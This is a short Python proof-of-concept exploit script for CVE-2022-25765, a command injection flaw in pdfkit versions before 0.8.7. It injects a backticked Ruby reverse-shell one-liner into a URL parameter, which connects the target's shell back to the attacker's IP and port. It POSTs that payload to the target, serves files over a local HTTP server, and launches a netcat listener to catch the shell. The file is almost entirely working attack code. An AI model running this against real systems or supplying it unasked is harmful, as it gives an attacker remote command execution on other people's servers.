import socketserver
import os
import threading
from http.server import SimpleHTTPRequestHandler
import requests
import sys
import time

# PoC Code for CVE-2022-25765 command injection for pdfkit < v0.8.7

# Usage:
# python3 2022-2675.py <target url> <listener ip> <listener port> <http server port>

target_url = sys.argv[1]
local_listener_ip = sys.argv[2]
local_listener_port = int(sys.argv[3])
local_http_port = int(sys.argv[4])


def http_server():
    with socketserver.TCPServer(('', local_http_port), SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()


def request_payload():
    string = f'ruby -rsocket -e'+"'"+f'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{local_listener_ip}",' \
                                     f'{local_listener_port}))'+"'"
    payload = f"http://{local_listener_ip}:{local_http_port}/?name=%20`{string}`"
    requests.post(f'{target_url}', data={"url": f'{payload}'})


http_thread = threading.Thread(target=http_server, daemon=True)
request_thread = threading.Thread(target=request_payload)
http_thread.start()
# open terminal for netcat listener
os.system(f'gnome-terminal -- bash -c -i "nc -lvnp {local_listener_port}; exec bash &"')
time.sleep(3)
request_thread.start()
